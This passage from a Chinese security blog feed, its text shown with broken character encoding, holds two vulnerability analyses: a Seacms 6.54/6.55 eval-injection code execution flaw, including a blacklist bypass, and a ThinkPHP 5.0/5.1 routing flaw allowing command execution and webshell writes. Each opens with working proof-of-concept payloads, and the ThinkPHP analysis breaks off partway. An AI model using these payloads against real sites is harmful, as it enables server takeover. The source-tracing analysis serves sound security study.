    <url>/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="0x01-æ¼æ´åˆ©ç”¨æ–¹å¼"><a href="#0x01-æ¼æ´åˆ©ç”¨æ–¹å¼" class="headerlink" title="0x01. æ¼æ´åˆ©ç”¨æ–¹å¼"></a>0x01. æ¼æ´åˆ©ç”¨æ–¹å¼</h1><p><strong>6.54ç‰ˆæœ¬ POC:</strong></p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//ip:port/search.php</span></span><br><span class="line"></span><br><span class="line">POSTï¼šsearchtype=<span class="number">5</span><span class="variable">&amp;searchword</span>=&#123;if&#123;searchpage:year&#125;<span class="variable">&amp;year</span>=:e&#123;searchpage:area&#125;&#125;<span class="variable">&amp;area</span>=v&#123;searchpage:letter&#125;<span class="variable">&amp;letter</span>=al&#123;searchpage:lang&#125;<span class="variable">&amp;yuyan</span>=(&#123;searchpage:jq&#125;<span class="variable">&amp;jq</span>=($_P&#123;searchpage:ver&#125;<span class="variable">&amp;ver</span>=OST[Cyc1e]))<span class="variable">&amp;</span>Cyc1e=phpinfo();</span><br></pre></td></tr></table></figure>

<p><strong>6.55ç‰ˆæœ¬ POC:</strong></p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//ip:port/search.php?phpinfo();</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">POST:</span>searchtype=<span class="number">5</span><span class="variable">&amp;searchword</span>=&#123;if&#123;searchpage:year&#125;<span class="variable">&amp;year</span>=:as&#123;searchpage:area&#125;&#125;<span class="variable">&amp;area</span>=s&#123;searchpage:letter&#125;<span class="variable">&amp;letter</span>=ert&#123;searchpage:lang&#125;<span class="variable">&amp;yuyan</span>=($_SE&#123;searchpage:jq&#125;<span class="variable">&amp;jq</span>=RVER&#123;searchpage:ver&#125;&amp;<span class="variable">&amp;ver</span>=[QUERY_STRING]));<span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<h1 id="0x02-æ¼æ´åˆ†æ"><a href="#0x02-æ¼æ´åˆ†æ" class="headerlink" title="0x02. æ¼æ´åˆ†æ"></a>0x02. æ¼æ´åˆ†æ</h1><h3 id="ç‰ˆæœ¬ï¼šSeacms-v6-54"><a href="#ç‰ˆæœ¬ï¼šSeacms-v6-54" class="headerlink" title="ç‰ˆæœ¬ï¼šSeacms v6.54"></a>ç‰ˆæœ¬ï¼šSeacms v6.54</h3><p>é¦–å…ˆSeacmsçš„å¤–éƒ¨å˜é‡GETã€POSTæäº¤æ–¹å¼åœ¨/include/common.phpä¸­è¿›è¡Œäº†ç”³æ˜ï¼š</p>
<p><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-4a4c77ead54ca2da.png" alt></p>
<p>æ‰€ä»¥åœ¨æäº¤å¤–éƒ¨å˜é‡æ—¶å¯ä»¥é€šè¿‡GETæ–¹å¼ã€ä¹Ÿå¯ä»¥é€šè¿‡POSTæ–¹å¼ã€‚æ¼æ´çš„å…¥å£ç‚¹åœ¨äºsearch.phpä¸­çš„å˜é‡$contentï¼Œå…¶ä¸­å˜é‡$searchwordä¼šä¼ é€’è¿›å…¥$contentä¸”å¯æ§ï¼Œ$searchwordåˆ†åˆ«ç»è¿‡RemoveXSS()å‡½æ•°å’Œcn_substr()çš„å¤„ç†ï¼Œå®šä½å˜é‡$searchwordï¼šsearch.phpï¼š16è¡Œ</p>
<p><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-cc76060de0e5abff.png" alt></p>
<p>æŸ¥çœ‹ç¬¬ä¸€å±‚å¤„ç†å‡½æ•°RemoveXSS()ï¼š/include/common.func.phpï¼š1657è¡Œ<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-bcc02bb9c8dc98bc.png" alt></p>
<p>å¯ä»¥çœ‹å‡ºRemoveXSS()å‡½æ•°å¯¹å˜é‡$searchwordè¿›è¡ŒXSSè¿‡æ»¤ï¼Œé¿å…è¢«XSSæ”»å‡»ï¼Œéšåè°ƒç”¨å‡½æ•°cn_substr()å¯¹å˜é‡$searchwordè¿›è¡Œå¤„ç†å®šä½æŸ¥çœ‹ï¼š/include/common.func.phpï¼š124è¡Œ<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-752aa29d80eee103.png" alt></p>
<p>å‡½æ•°cn_substr()å¯¹å˜é‡$searchwordè¿›è¡Œå­—ç¬¦é•¿åº¦é™åˆ¶ï¼Œé™åˆ¶å­—ç¬¦é•¿åº¦ä¸è¶…è¿‡20ï¼Œåˆæ­¥çš„ä¸¤å±‚å¤„ç†è§†ä¹è®©äººæ„Ÿè§‰å˜é‡$searchwordç›¸å¯¹æ¯”è¾ƒå®‰å…¨ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›ï¼Œ$searchwordéšåæ ¹æ®ç¨‹åºæµå°†ä¼ å…¥echoSearchPage()ï¼Œåœ¨æ‰§è¡ŒechoSearchPage()ä¹‹å‰ï¼Œæœ‰ä¸€ä¸ªåˆ¤æ–­è¯­å¥ï¼šsearch.phpï¼š56è¡Œ<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-b9878fc394edfc9f.png" alt></p>
<p>æ‰€ä»¥åœ¨æ„é€ Payloadæ—¶éœ€è¦ç»™å˜é‡$searchtypeèµ‹å€¼ä¸ºâ€˜5â€™ï¼Œæ‰èƒ½å¤Ÿç»§ç»­æ‰§è¡Œç¨‹åºæµï¼Œå˜é‡$searchwordéšåä¼ é€’è¿›å…¥å˜é‡$contentä¸­ï¼Œå¹¶ä¸”è¿›è¡Œäº†å¤šæ¬¡çš„str_replaceæ›¿æ¢å¤„ç†ï¼šsearch.phpï¼š159è¡Œ<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-fff28fd8fe14389e.png" alt></p>
<p>å¤šæ¬¡æ›¿æ¢å¤„ç†å˜é‡$contentåï¼Œå°†å…¶ä¼ å…¥parseIf()ä¸­</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$content</span>=<span class="variable">$mainClassObj</span>-&gt;parseIf(<span class="variable">$content</span>);<span class="regexp">//search</span>.phpï¼š<span class="number">216</span>è¡Œ</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›æŸ¥çœ‹å‡½æ•°parseIf():/include/main.class.phpï¼š3149è¡Œ<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-f3c3abce2e544d9d.png" alt></p>
<p>å˜é‡$labelRuleã€$labelRule2ã€$labelRule3å®šä¹‰äº†æ­£åˆ™è§„åˆ™ï¼Œé€šè¿‡preg_match_allå°†$contentè¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œå³åŒ¹é…å‡ºâ€˜{if:â€™å’Œâ€˜{end if}â€™ä¸­çš„å­—ç¬¦ä¸²ï¼Œå¹¶å°†åŒ¹é…çš„ç»“æœä¼ å…¥åˆ°$iarä¸­ï¼Œéšåå°†æ•°ç»„$iar[1][$m]ä¸­çš„å­—ç¬¦èµ‹å€¼ç»™å˜é‡$strIf,å¹¶åœ¨æœ€ç»ˆçš„æ¡ä»¶åˆ¤æ–­ä¸­ä¼ å…¥eval()å‡½æ•°<code>@eval(&quot;if(&quot;.$strIf.&quot;) { \$ifFlag=true;} else{ \$ifFlag=false;}&quot;);</code><br>æ‰€ä»¥å¦‚æœå˜é‡$strIfçš„å€¼å¯ä»¥æ¶æ„æ„é€ ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†æ¶æ„ä»£ç ä¼ å…¥eval()å¹¶æ‰§è¡Œï¼Œè¿™ä¹Ÿæ˜¯æ¼æ´çš„ä¸»è¦ï¼Œæ‰€é‡Œæ•´ä¸ªæ¼æ´åˆ©ç”¨é“¾åœ¨äº:<br>$searchword-&gt;$content-&gt;parseIf($content)-&gt;preg_match_all()-&gt;$iar-&gt;$strIf-&gt;eval()ã€‚</p>
<p>æ„é€ POCï¼š</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">searchtype</span>=5&amp;searchword=&#123;<span class="keyword">if</span>&#123;searchpage:year&#125;&amp;<span class="attribute">year</span>=:e&#123;searchpage:area&#125;&#125;&amp;<span class="attribute">area</span>=v&#123;searchpage:letter&#125;&amp;<span class="attribute">letter</span>=al&#123;searchpage:lang&#125;&amp;yuyan=(&#123;searchpage:jq&#125;&amp;jq=(<span class="variable">$_P</span>&#123;searchpage:ver&#125;&amp;<span class="attribute">ver</span>=OST[Cyc1e]))&amp;<span class="attribute">Cyc1e</span>=phpinfo();</span><br></pre></td></tr></table></figure>

<p>å³å…¶ä¸­searchword={if{searchpage:year}å¯ä»¥é€šè¿‡RmoveXSS()çš„è¿‡æ»¤ï¼Œä¹Ÿå¯ä»¥é€šè¿‡cn_ substr()çš„20å­—ç¬¦çš„é™åˆ¶ï¼Œ echoSearchPage()å¯¹searchpageæ ‡ç­¾è¿›è¡Œå¤šæ¬¡æ›¿æ¢å¤„ç†å¤„ç†ï¼Œæœ€ç»ˆ$contentä¸­ä¼šåŒ…å«ï¼ševal(($_POST[Cyc1e]))<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-ea0396d56f39310c.png" alt></p>
<p>$contentä¼ å…¥parseIf()åè¿›è¡Œæ­£åˆ™åŒ¹é…å¤„ç†æœ€ç»ˆä¼ å…¥å˜é‡$strIfï¼Œæ‰“å°å˜é‡$strIfæŸ¥çœ‹ï¼š<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-b0ab3991f63b209c-1583322731483.png" alt></p>
<p>å¯ä»¥çœ‹å‡º$contentä¸­åŒ…å«çš„æ¶æ„ä»£ç eval(($_POST[Cyc1e]))è¢«ä¼ å…¥åˆ°å˜é‡$strIfä¸­ï¼Œå¹¶æœ€ç»ˆé€šè¿‡eval()å‡½æ•°è¾¾åˆ°æ¶æ„ä»£ç çš„æ‰§è¡Œï¼Œå³é€šè¿‡æ¶æ„ä»£ç å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<h3 id="ç‰ˆæœ¬ï¼š6-55"><a href="#ç‰ˆæœ¬ï¼š6-55" class="headerlink" title="ç‰ˆæœ¬ï¼š6.55"></a>ç‰ˆæœ¬ï¼š6.55</h3><p>6.55ç‰ˆæœ¬é’ˆå¯¹è¯¥æ¼æ´ï¼Œåœ¨parseIf()ä¸­æ·»åŠ äº†ä¸€ä¸ªé»‘åå•ï¼š/include/main.class.phpï¼š3106<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-0eb7b6a9f93ba2cd.png" alt></p>
<p>ä½†æ˜¯é€šè¿‡search.phpä¸­$contentæ„é€ çš„æ¶æ„ä»£ç ä»ç„¶èƒ½æ­£å¸¸çš„ä¼ é€’åˆ°parseIf()å‡½æ•°ä¸­ï¼Œå³æ¼æ´çš„åˆ©ç”¨åŸæ¥æ˜¯æ²¡æœ‰å˜çš„ï¼Œè€Œé»‘åå•åªæ˜¯è¿‡æ»¤äº†ä¸€äº›æ•æ„Ÿå‡½æ•°å’Œ_GETã€_POSTã€_REQUESTå’Œ_COOKIEä¼ å‚æ–¹å¼ï¼Œè€ŒHTTPä¸­ä¼ é€’å‚æ•°è¿˜æœ‰$_SERVERæ–¹å¼ï¼Œæ‰€ä»¥æ„é€ $searchwordæ—¶ï¼Œé€šè¿‡åˆ©ç”¨$_SERVERæ¥è·å–å˜é‡å·²ç„¶èƒ½å¤Ÿè¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„ç›®çš„ã€‚æ„é€ $searchwordï¼ˆæ”¾freebufä¸­å¤§ä½¬çš„ï¼‰:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">searchtype</span>=5&amp;searchword=&#123;<span class="keyword">if</span>&#123;searchpage:year&#125;&amp;<span class="attribute">year</span>=:as&#123;searchpage:area&#125;&#125;&amp;<span class="attribute">area</span>=s&#123;searchpage:letter&#125;&amp;<span class="attribute">letter</span>=ert&#123;searchpage:lang&#125;&amp;yuyan=(<span class="variable">$_SE</span>&#123;searchpage:jq&#125;&amp;<span class="attribute">jq</span>=RVER&#123;searchpage:ver&#125;&amp;&amp;ver=[QUERY_STRING]));/*</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡echoSearchPage()ä¸­å¯¹searchpageæ ‡ç­¾çš„æ›¿æ¢ï¼Œ$contentä¸­åŒ…å«</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">if(<span class="name">assert</span>($_SERVER[QUERY_STRING]))<span class="comment">;/*</span></span><br></pre></td></tr></table></figure>
<p>é€šè¿‡è®¿é—®URLï¼šhttp://[ip]:[port]/search.php?phpinfo();å³å¯è§¦å‘åˆ©ç”¨ï¼Œå¹¶ä¸”åŒæ ·å¯ä»¥è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„æ•ˆæœï¼Œsystem()å‡½æ•°çš„æ‰§è¡Œæ–¹å¼è¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-3c6ecb3f0255c93c.png" alt></p>
<p><strong>æ¼æ´åˆ†æä»…ç”¨äºå­¦ä¹ ï¼ï¼ï¼ä¸€åˆ‡å®é™…æ”»å‡»åˆ©ç”¨è¡Œä¸ºæ¦‚ä¸è´Ÿè´£ã€‚</strong></p>
]]></content>
      <categories>
        <category>Cyc1eçš„æ¼æ´åˆ†æä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP 5.0 &amp; 5.1è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨åˆ†æ</title>
    <url>/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="0x01-æ¼æ´åˆ©ç”¨æ–¹å¼"><a href="#0x01-æ¼æ´åˆ©ç”¨æ–¹å¼" class="headerlink" title="0x01 æ¼æ´åˆ©ç”¨æ–¹å¼"></a>0x01 æ¼æ´åˆ©ç”¨æ–¹å¼</h1><p><strong>5.0ç‰ˆæœ¬POCï¼ˆä¸å”¯ä¸€ï¼‰</strong></p>
<blockquote>
<p>å‘½ä»¤æ‰§è¡Œï¼š?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=[ç³»ç»Ÿå‘½ä»¤]<br>æ–‡ä»¶å†™å…¥ï¼š?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][1]=<?php phpinfo();?></p>
</blockquote>
<p><strong>5.1ç‰ˆæœ¬POCï¼ˆä¸å”¯ä¸€ï¼‰</strong></p>
<blockquote>
<p>å‘½ä»¤æ‰§è¡Œï¼š?s=index/\think\Request/input&amp;filter=system&amp;data=[ç³»ç»Ÿå‘½ä»¤]<br>æ–‡ä»¶å†™å…¥ï¼š?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<?php phpinfo();?></p>
</blockquote>
<p>#0x02 æ¼æ´åˆ†æ<br>ç‰ˆæœ¬ï¼š Thinkphp v5.1.29ï¼ˆå½±å“ç‰ˆæœ¬&lt;5.1.31å’Œ&lt;5.0.23ï¼‰<br>æœ¬æ¬¡åˆ†æç¯å¢ƒï¼šPHP/7.0.12 + Apache2</p>
<p>ThinkPHPå®˜æ–¹åœ¨12æœˆ9æ—¥å‘å¸ƒäº†5.*ç‰ˆæœ¬çš„æ›´æ–°ï¼Œæ›´æ–°è¯´æ˜â€œç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½çš„getshellæ¼æ´â€ï¼Œæ‰€ä»¥æ¼æ´çš„è§¦å‘åœ¨è·¯ç”±è°ƒåº¦æ—¶,thinkphpä¸­ç”±å‡½æ•°pathinfo()æ¥è·å–è·¯ç”±ï¼Œå®šä½å‡½æ•°æŸ¥çœ‹ï¼š/thinkphp/library/think/Request.phpï¼š678è¡Œ </p>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-7fc1e93a2a0a36d2-1583322083188.jpg" alt="pathinfo"></p>
<p>å…¶ä¸­åœ¨æ–‡ä»¶31è¡Œå®šä¹‰äº†var_pathinfoçš„é»˜è®¤å€¼ä¸ºs ï¼š</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PATHINFOå˜é‡å ç”¨äºå…¼å®¹æ¨¡å¼</span></span><br><span class="line"><span class="string">'var_pathinfo'</span>   =&gt; <span class="string">'s'</span></span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥å½“è¯·æ±‚æŠ¥æ–‡ä¸­ä»¥GETå½¢å¼ä¼ å…¥så‚æ•°æ˜¯ï¼Œåˆ™å°†å…¶å€¼ä½œä¸ºpathinfoã€‚å…¨å±€æŸ¥æ‰¾pathinfo()å‡½æ•°çš„è°ƒç”¨æƒ…å†µï¼Œå¯ä»¥å‘ç°åŒæ–‡ä»¶ä¸‹pathå‡½æ•°å¯¹å…¶è¿›è¡Œè°ƒç”¨ï¼Œå®šä½path()å‡½æ•°æŸ¥çœ‹ï¼š/thinkphp/library/think/Request.phpï¼š716è¡Œ<img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-45d43f5b8b9de119.jpg" alt></p>
<p>è°ƒç”¨pathinfo()å‡½æ•°è·å–è·¯ç”±ä¿¡æ¯ï¼Œå¹¶å°†è¿”å›å€¼èµ‹å€¼ç»™äº†$this-&gt;pathï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ§åˆ¶è¯¥å˜é‡ï¼Œå³path()å‡½æ•°çš„è¿”å›å€¼ï¼Œç»§ç»­è·Ÿè¸ªpathå‡½æ•°çš„è°ƒç”¨æƒ…å†µï¼Œå®šä½å‡½æ•°routecheck()ï¼š/thinkphp/library/think/App.phpï¼š583è¡Œ</p>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-6c096399e25f84b7.png" alt></p>
<p>è¯¥å‡½æ•°è¿›è¡Œè·¯ç”±æ£€æµ‹ï¼Œä¸”å°†æˆ‘ä»¬å¯æ§çš„$pathå˜é‡ä¼ é€’åˆ°äº†check()å‡½æ•°ä¸­è¿›è¡Œå¤„ç†ï¼Œå®šä½æŸ¥çœ‹check()å‡½æ•°ï¼š/thinkphp/library/think/Route.phpï¼š877è¡Œ<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-acfd70f549919220.png" alt></p>
<p>è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥çœ‹å‡ºä¸ºä½•å®˜æ–¹è¯´æ˜ï¼Œåœ¨å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹ä¸å—è¯¥æ¼æ´çš„å½±å“ï¼Œå¦‚æœå¼€å¯å¼ºåˆ¶è·¯ç”±ï¼Œåˆ™checkå¤„ç†ä¼ å…¥çš„ç”±æˆ‘ä»¬æ„é€ çš„$urlå˜é‡æ—¶ä¼šå®ä¾‹åŒ–RouteNotFoundExceptionå¯¹è±¡ï¼Œå³æŠ¥å‡ºå¯¹åº”çš„é”™è¯¯ã€‚</p>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-7ce5cfc6d18a20dd.png" alt></p>
<p>è€Œé»˜è®¤è·¯ç”±è§£ææƒ…å†µä¸‹ï¼Œcheck()å‡½æ•°å®ä¾‹åŒ–äº†UrlDispatchå¯¹è±¡ï¼Œå¹¶å°†$urlä¼ é€’ç»™äº†æ„é€ å‡½æ•°è¿›è¡Œå¤„ç†ï¼ŒUrlDispatchç»§æ‰¿Dispatchï¼Œåˆ†æå…¶çˆ¶ç±»Dispatchçš„æ„é€ å‡½æ•°ï¼Œè·Ÿè¸ªæŸ¥çœ‹ï¼šlibrary/think/route/Dispatch.phpï¼š64è¡Œ<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-8af1effac8ce52c2.png" alt></p>
<p>ä¼ å…¥çš„$dispatchå˜é‡å€¼èµ‹å€¼ç»™äº†$this-&gt;dispatch,å…¨å±€æ”¶ç´¢$this-&gt;diapatchçš„å¤„ç†æƒ…å†µï¼Œæœ€ç»ˆä¼šä¼ å…¥Urlç±»ä¸­çš„init()å‡½æ•°è¿›è¡Œå¤„ç†ï¼Œè·Ÿè¸ªæŸ¥çœ‹init()å‡½æ•°ï¼š/thinkphp/library/think/route/dispatch/Url.phpï¼š20è¡Œ</p>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-7befd70637eb95d8.png" alt></p>
<p>init()å‡½æ•°è°ƒç”¨parseUrl()å‡½æ•°å¯¹$this-&gt;diapatchå˜é‡è¿›è¡Œå¤„ç†ï¼Œè·Ÿè¸ªæŸ¥çœ‹ï¼š/thinkphp/library/think/route/dispatch/Url.phpï¼š37è¡Œ</p>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-4fc3337a8109beaf.png" alt></p>
<p>ParseUrl()å‡½æ•°åˆå°†å˜é‡ä¼ å…¥åˆ°äº†parseUrlPath()å‡½æ•°ä¸­ï¼Œç»§ç»­å®šä½æŸ¥çœ‹parseUrlPath()å‡½æ•°ï¼š/thinkphp/library/think/route/Rule.phpï¼š951è¡Œ</p>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-24530b9cc6bcb1b6.png" alt></p>
<p>åˆ©ç”¨â€˜/â€™å¯¹$urlå˜é‡è¿›è¡Œåˆ†å‰²ï¼Œä¸”$urlçš„æ ¼å¼ä¸ºâ€˜æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œâ€™ï¼Œå°†$urlåˆ†å‰²åçš„å€¼å­˜æ”¾åœ¨$pathå˜é‡å½“ä¸­ï¼Œå¹¶è¿”å›åˆ°parseUrl()å‡½æ•°ï¼Œæœ€ç»ˆè¿”å›åˆ°Urlç±»ä¸­init()å‡½æ•°: /thinkphp/library/think/route/dispatch/Url.phpï¼š20è¡Œ</p>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-7d645035cf4370c4.png" alt></p>
<p>æœ€ç»ˆåˆ†å‰²åå°è£…å¥½çš„è·¯ç”±ä¿¡æ¯æ•°ç»„ä¼ é€’åˆ°äº†$resultå˜é‡ä¸­ï¼Œéšåä¼ é€’åˆ°äº†Moduleçš„æ„é€ å‡½æ•°è¿›è¡Œå¤„ç†ï¼Œç”±äºModuleçš„çˆ¶ç±»ä¹Ÿæ˜¯Dispatchï¼Œå³å°†$resultå€¼ä¼ é€’ç»™äº†å˜é‡$this-&gt;dispatchï¼Œéšåè°ƒç”¨Moduleç±»çš„init()å‡½æ•°å¯¹$this-&gt;dispatchè¿›è¡Œå¤„ç†ï¼Œå®šä½æŸ¥çœ‹ï¼š/thinkphp/library/think/route/dispatch/Module.phpï¼š27è¡Œ<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-128ecac19dded730.png" alt></p>
<p>åœ¨åˆå§‹åŒ–æ¨¡å—çš„åˆ¤æ–­è¯­å¥ä¸­ï¼Œå¯¹$moduleè¿›è¡Œåˆ¤æ–­ï¼Œåˆ™éœ€è¦$availableçš„å€¼ä¸ºtrueï¼Œå³éœ€è¦is_dir($this-&gt;app-&gt;getAppPath() . $module çš„åˆ¤æ–­æ¡ä»¶æˆç«‹ï¼Œç”±äºé»˜è®¤æ¨¡å—æ˜¯indexï¼Œæ‰€ä»¥å…¥å£æ¨¡å—ä¸ºindexï¼Œä¹Ÿå¯ä»¥ç”¨â€˜.â€™è¿›è¡Œæ›¿æ¢ã€‚$this-&gt;dispatchçš„å€¼æœ€ç»ˆä¼ é€’åˆ°$this-&gt;controllerä¸­ï¼Œinit()å‡½æ•°å¤„ç†å®Œè¿‡åï¼Œè¿›å…¥exec()å‡½æ•°ï¼ŒæŸ¥çœ‹å‡½æ•°ä»£ç : /thinkphp/library/think/route/dispatch/Module.phpï¼š85è¡Œ<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-f480d5d4f6d5690e.png" alt></p>
<p>exec()å‡½æ•°å°†å˜é‡$this-&gt;controllerä¼ é€’ç»™äº†controller()å‡½æ•°è¿›è¡Œå¤„ç†ï¼Œç»§ç»­è·Ÿè¸ªcontroller()è¿›è¡ŒæŸ¥çœ‹ï¼š/thinkphp/library/think/App.phpï¼š720è¡Œ<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-99aa7524968a38ab.png" alt></p>
